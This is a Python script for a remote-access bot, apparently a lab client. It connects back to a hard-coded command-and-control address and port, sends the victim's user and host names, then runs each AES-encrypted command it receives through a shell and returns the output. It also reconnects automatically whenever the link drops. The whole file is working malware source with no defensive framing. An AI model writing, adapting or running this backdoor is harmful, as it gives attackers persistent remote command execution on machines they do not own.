#!/usr/bin/env python3
import socket, sys, os, json, subprocess, time, base64, platform, psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ============ CHANGE THIS ============
C2_IP   = "192.168.91.128"
C2_PORT = 4444
# =====================================

AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV  = b'ThisIsA16ByteIV!'

def encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)

def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        out = (r.stdout + r.stderr).strip()
        # Make multi-line output single-line friendly for the broken server
        out = out.replace("\n", " | ")
        return out or "[no output]"
    except Exception as e:
        return f"Error: {e}"

connection = None

def connect():
    global connection
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((C2_IP, C2_PORT))
            print(f"[+] Connected to {C2_IP}:{C2_PORT}")
            return
        except Exception as e:
            print(f"[-] Connect failed: {e}")
            time.sleep(4)

def send(data):
    try:
        if not isinstance(data, str):
            data = json.dumps(data)
        # Keep replies short so the original server doesn't break
        if len(data) > 800:
            data = data[:800] + " ...[truncated]"
        connection.send(encrypt(data))
        print(f"[>] Sent: {data[:100]}")
    except Exception as e:
        print(f"[-] Send error: {e}")
        connect()

def receive():
    buf = b""
    while True:
        try:
            chunk = connection.recv(4096)
            if not chunk:
                raise ConnectionError("disconnected")
            buf += chunk
            try:
                plain = decrypt(buf).decode()
                print(f"[<] Received: {plain}")
                try:
                    return json.loads(plain)
                except:
                    return plain
            except:
                continue
        except Exception as e:
            print(f"[-] Receive error: {e}")
            connect()
            return None

def main():
    connect()
    info = f"Linux bot | user={os.getenv('USER')} | host={platform.node()}"
    send(info)

    while True:
        cmd = receive()
        if cmd is None:
            continue

        print(f"[*] Executing: {cmd}")

        if isinstance(cmd, dict):
            cmd = str(cmd)

        if cmd in ["exit", "quit"]:
            send("Client exiting")
            break
        elif cmd in ["info", "steal_info", "sysinfo"]:
            send(info)
        elif cmd == "pwd":
            send(os.getcwd())
        elif cmd.startswith("cd "):
            try:
                os.chdir(cmd[3:].strip())
                send(f"Changed to {os.getcwd()}")
            except Exception as e:
                send(str(e))
        else:
            result = run_cmd(cmd)
            send(result)

if __name__ == "__main__":
    print("[*] Starting fixed Linux client (single-line replies)...")
    main()
